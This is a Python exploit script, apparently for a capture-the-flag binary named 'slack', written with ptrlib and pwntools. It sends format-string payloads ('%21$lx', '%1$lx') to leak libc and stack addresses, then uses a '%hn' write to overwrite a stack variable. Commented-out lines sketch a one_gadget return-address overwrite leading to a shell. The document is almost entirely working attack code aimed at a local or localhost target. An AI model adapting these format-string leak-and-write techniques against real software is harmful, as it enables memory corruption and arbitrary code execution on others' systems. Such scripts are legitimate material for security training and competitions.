#!/usr/bin/env python
import ptrlib as ptr
from pwn import fmtstr_payload, context, ELF
import sys

elf = ptr.ELF("./slack_patched")
libc = ptr.ELF("./libc.so.6")

context.binary = ELF(elf.filepath)


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return ptr.Socket("localhost", 5000)
    else:
        return ptr.Process(elf.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def main():
    io = connect()

    #
    # leak libc and stack
    #

    payload = b"%21$lx#"  # stack
    payload += b"%1$lx#"  # libc
    print("1: ", payload.decode())
    io.sendafter(b"): ", payload)
    io.recvuntil(b"You: ")
    libc.base = int(io.recvuntil(b"#").strip(b"#"), 16) - 0x29D90
    stack_base = int(io.recvuntil(b"#").strip(b"#"), 16) - 0x1DDC0
    ptr.logger.info(f"libc: {hex(libc.base)}")
    ptr.logger.info(f"stack: {hex(stack_base)}")

    #
    # overwrite i to a huge negative value
    #
    # ret_addr = stack_base + (0x7FFD8F295498 - 0x7FFD8F293300)
    # i_addr = ret_addr - (14 * 8)
    i_addr = stack_base + 0x1FDD8
    payload = f"%{(i_addr + 3) & 0xffff}c%28$hn".encode()
    print("2: ", payload.decode())
    if len(payload) == 13:
        io.sendafter(b"):", payload)
    else:
        io.sendlineafter(b"): ", payload)

    # payload = f"%255c%55$hn".encode()
    # print("3: ", payload.decode())
    # io.sendlineafter(b"): ", payload)
    # input(">>>")

    payload = f"#%55$lx#".encode()
    io.sendline(payload)
    io.recvuntil(b"#")
    leak = io.recvline().strip(b"#").decode()
    print(leak)
    # print(io.is_alive())

    # one_gadgets = [0xEBC81, 0xEBC85, 0xEBC88, 0xEBCE2, 0xEBD38, 0xEBD3F, 0xEBD43]
    # ret_addr = stack_base + 0x1FF68
    # payload = ptr.p64(ret_addr)
    # payload += f"{str(one_gadgets[0])}$14%hn".encode()
    # print(hex(ret_addr))
    # print(hex(libc.base + one_gadgets[0]))
    # print("2: ", payload)
    # io.sendlineafter(b"Professional): ", payload)

    # io.sh()


if __name__ == "__main__":
    main()
